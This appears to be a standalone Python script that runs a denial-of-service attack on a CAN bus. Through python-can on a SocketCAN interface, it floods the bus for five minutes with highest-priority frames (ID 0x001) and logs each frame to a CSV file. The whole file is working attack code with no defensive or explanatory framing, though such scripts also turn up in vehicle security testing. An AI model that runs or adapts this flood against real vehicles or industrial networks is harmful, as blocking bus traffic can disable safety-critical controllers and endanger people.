import can
import time
import csv

# Initialize CAN interface
bus = can.interface.Bus(channel='can0', bustype='socketcan')

# Define the attack duration
attack_duration = 300  # Duration of the attack in seconds

# File to log the attack messages
attack_log_file = 'dos_attack_log.csv'

def dos_attack():
    attack_start_time = time.time()
    attack_end_time = attack_start_time + attack_duration

    with open(attack_log_file, 'w', newline='') as csv_file:
        csv_writer = csv.writer(csv_file)
        csv_writer.writerow(['Timestamp', 'ID', 'Data'])

        while time.time() <= attack_end_time:
            # High priority CAN message flooding
            msg = can.Message(arbitration_id=0x001, data=[0x00] * 8, is_extended_id=False)
            bus.send(msg)

            # Loging
            timestamp = time.time()
            csv_writer.writerow([timestamp, hex(msg.arbitration_id), ''.join(format(x, '02x') for x in msg.data)])

            time.sleep(0.001)  # Small delay to prevent overwhelming the hardware


if __name__ == "__main__":
    dos_attack()
